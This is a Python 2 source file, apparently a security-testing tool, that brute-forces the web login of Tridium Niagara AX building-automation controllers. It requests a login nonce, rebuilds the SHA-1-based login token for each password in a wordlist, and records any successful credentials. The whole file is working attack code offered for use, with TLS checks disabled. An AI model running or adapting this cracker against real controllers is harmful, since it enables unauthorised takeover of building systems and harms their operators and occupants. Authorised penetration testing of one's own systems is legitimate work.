#-------------------------------------------------------------------------------
# Name:        NiagaraPswd.py
# Purpose:     Tridium Niagara Password Cracker
# PythonVer:   2.7
# Author:      VenomInfoSec
#-------------------------------------------------------------------------------
import hashlib
import os
import sys
import requests
import base64
import urllib
import time
import argparse


def main():

    #Arg parse
    parser = argparse.ArgumentParser(description='Brute force Tridium Niagara AX Web Login')
    parser.add_argument('target',help='The IP or root URL of the Tridium Niagara AX Webpage')
    parser.add_argument('-l','--list',help='The path of the wordlist to be used',required='True')
    parser.add_argument('-u','--username',help='The username to try',required='True')
    parser.add_argument('-f','--failure',help='The path of the webpage that illustrates what a failed login attempt is',required='True')
    parser.add_argument('-r','--resume',help='If the last attempt resulted in unexpected program failure, use this option to resume from the last credentail tried',action='store_true')
    parser.add_argument('-s', '--scheme', help='Scheme of base URL, default: http.')
    args = parser.parse_args()
    scheme = str(args.scheme) if args.scheme is not None else 'http'
    target = str(args.target)
    wordlist = str(args.list)
    username = str(args.username)
    webpageFail = str(args.failure)
    resume = False
    if args.resume:
        resume = True

    #Input error checking
    try:
        with open(wordlist,'r') as data:
            None
    except IOError:
        print ' [!] ERROR: Invalid wordlist file name, quitting'
        sys.exit()
    try:
        with open(webpageFail,'r') as data:
            None
    except IOError:
        print ' [!] ERROR: Invalid failure file name, quitting'
        sys.exit()

    #Check for fails last time
    startPoint = ''
    startPointCheck = False
    foundStart = False
    if resume == True:
        with open('LastCredTryBeforeFail.txt','r') as startPointFile:
            if len(startPointFile.readlines()) != 0:
                startPointCheck = True
        with open('LastCredTryBeforeFail.txt','r') as startPointFile:
            for line in startPointFile:
                if ':' in line:
                    startPoint = line.split(':')[1]
        if len(startPoint) > 0:
            print ' [*] Resuming attempts from %s' % (startPoint)

    #Initialize password list
    print ' [*] Initializing wordlist...\n'
    passwordList = []
    with open(wordlist,'r') as passList:
        if startPointCheck == False:
            for line in passList:
                passwordList.append(line.rstrip('\n'))
        elif startPointCheck == True:
            for line in passList:
                if foundStart == False:
                    if startPoint in line:
                        foundStart = True
                        passwordList.append(line.rstrip('\n'))
                elif foundStart == True:
                    passwordList.append(line.rstrip('\n'))

    #Initialize failed webpage
    webpage = ''
    with open(webpageFail,'r') as initFile:
        for line in initFile:
            webpage+=line

    #Test passwords
        for password in passwordList:
            try:
                if testCreds(target, username, password, webpage, scheme=scheme) == True:
                    with open('successful_creds.txt','a') as output:
                        output.write(str(password))
                        output.write('\n')
                    try:
                        input(' [*] Hit enter to continue trying passwords or Ctl+C to quit')
                    except SyntaxError:
                        None
            except KeyboardInterrupt:
                print ' [!] Keyboard Interrupt, saving last tried creds'
                with open('LastCredTryBeforeFail.txt','w') as output:
                    output.write(str(username)+':'+str(password))
                    output.write('\n')
                sys.exit()


def testCreds(target, username, password, webpage,
              scheme=None):
    try:
        #Get unique nonce & session cookie
        scheme = scheme if scheme is not None else 'http'
        data = 'action=getnonce'
        headers = { 'Host'          :   str(target),
                    'User-Agent'    :   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0',
                    'Accept'        :   '*/*',
                    'Accept-Language':  'en-US,en;q=0.5',
                    'Accept-Encoding':  'gzip, deflate',
                    'Referer'       :   'http://'+str(target)+'/login',
                    'Content-Type'  :   'application/x-niagara-login-support',
                    'Content-Length':   '15',
                    'Connection'    :   'close'
        }
        r = requests.post(str(scheme)+'://'+str(target)+'/login',
                          data=data, headers=headers, verify=False)
        nonce = str(r.text)
        cookieDict = {}
        cookieDict = r.cookies.get_dict()

        #Set cred information
        username = username
        password = password

        #Generate token
        loginToken = base64encode(username + ":" + nonce + ":" + hex_sha1(hex_sha1(username + ":" + password) + ":" + nonce))

        #Send token & cookie
        data2 = str(urlEncode(loginToken))
        cookie2 = cookieDict.get('niagara_session')
        cookies2 = {'niagara_session': str(cookie2)}
        headers2 = {'Host'          :   str(target),
                    'User-Agent'    :   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0',
                    'Accept'        :   'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language':  'en-US,en;q=0.5',
                    'Accept-Encoding':  'gzip, deflate',
                    'Referer'       :   'http://'+str(target)+'/login',
                    'Content-Type'  :   'application/x-www-form-urlencoded',
                    'Content-Length':   str(6+len(data2)),
                    'Cookie'        :   'niagara_session='+str(cookie2),
                    'Connection'    :   'close',
                    'Upgrade-Insecure-Requests': '1'
        }
        r2 = requests.post(str(scheme)+'://'+str(target)+'/login',
                           data=data2, headers=headers2, cookies=cookies2, verify=False)

        #New get request with session cookie
        cookies3 = {}
        cookies3['niagara_auth_retry']='true'
        cookies3['niagara_session']=cookieDict.get('niagara_session')
        headers3 = {'Host'          :   str(target),
                    'User-Agent'    :   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0',
                    'Accept'        :   'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language':  'en-US,en;q=0.5',
                    'Accept-Encoding':  'gzip, deflate',
                    'Referer'       :   'http://'+str(target)+'/login',
                    'Cookie'        :   'niagara_session='+str(cookie2)+'; niagara_auth_retry=true',
                    'Connection'    :   'close',
                    'Upgrade-Insecure-Requests': '1'
        }
        r3 = requests.get(str(scheme)+'://'+str(target)+'/login',
                          headers=headers3, cookies=cookies3, verify=False)

        #Examine reponse to determine if successful login
        if testEquality(webpage,r3) == True:
            print ' [-] %s:%s is incorrect' % (username, password)
            return False
        else:
            print ' [+] %s:%s is correct!' % (username, password)
            return True

    #Error handling
    except requests.exceptions.ConnectionError as ex:
        print ' [!] {0}'.format(ex)
        time.sleep(5)
        return testCreds(target, username, password, webpage, scheme=scheme)
    except Exception as e:
        print ' [!] Unexpected Exception: '+str(e)
        with open('LastCredTryBeforeFail.txt','w') as output:
            output.write(str(username)+':'+str(password))
            output.write('\n')


#Test known failed webpage with generated webpage
def testEquality(negative,check):
    one = ''
    two = ''
    for i in negative:
        one+=i
    for j in check:
        two+=j
    if one == two:
        return True
    else:
        return False


#Url encode string
def urlEncode(passedString):
    return urllib.quote_plus(passedString)


#Base64 encode string
def base64encode(passedString):
    return base64.b64encode(passedString)


#Generate SHA1 hash of string
def hex_sha1(passedString):
    hash_object = hashlib.sha1(passedString)
    hex_dig = hash_object.hexdigest()
    return hex_dig


if __name__ == '__main__':
    main()
